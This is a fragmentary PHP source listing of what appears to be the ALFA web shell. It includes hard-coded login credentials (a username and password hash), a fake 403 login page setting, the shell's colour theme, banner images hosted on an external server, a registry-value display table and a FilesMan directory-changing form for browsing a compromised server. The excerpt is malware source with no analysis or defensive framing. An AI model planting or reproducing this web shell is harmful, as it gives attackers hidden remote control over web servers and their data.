...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'saul',
    'password' => '7fc3f936f73d5684182b446f698015b1',
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"header_vars" => "rgb(255, 251, 0)",
		"header_values" => "#25ff00",
		"header_on" => "#00FF00",
		"header_off" => "#ff0000",
		"header_none" => "#00FF00",
		"home_shell" => "#ff0000",
		...
		"footer_text" => "rgb(255, 251, 0)",
		"menu_options" => "rgb(255, 251, 0)",
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://res.cloudinary.com/dzujj1seq/image/upload/v1719811646/SEOTOBRUT_kx1nyj.png" /></center>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://res.cloudinary.com/dzujj1seq/image/upload/v1719811646/SEOTOBRUT_kx1nyj.png" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['loader']='https://res.cloudinary.com/dzujj1seq/image/upload/v1736711686/TextStudio-1-13-2025_rhxsvr.png';
...
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#25ff00\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#25ff00\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#25ff00\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
...
echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=rgb(255, 251, 0)>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
}
